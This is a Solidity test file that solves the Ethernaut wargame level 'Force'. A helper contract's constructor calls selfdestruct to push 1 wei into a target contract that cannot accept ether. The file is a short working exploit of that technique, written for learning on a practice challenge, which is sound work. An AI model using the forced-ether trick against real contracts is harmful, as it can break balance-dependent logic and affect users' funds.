// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./base/EthernautTest.sol";

// Set actual level contract file
import "../../src/7_Force.sol";

contract LevelTest is EthernautTest {

    function setUp() public {
        // Set actual level factory address
        levelSetUp(LEVEL_7_FORCE_ADDRESS, 0);

        // Additional setup
    }

    function testAttack() public validateInstance {
        Force force = Force(levelInstance);
        
        new SelfDestructed{value: 1 wei}(payable(address(force)));
    }
}

contract SelfDestructed {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}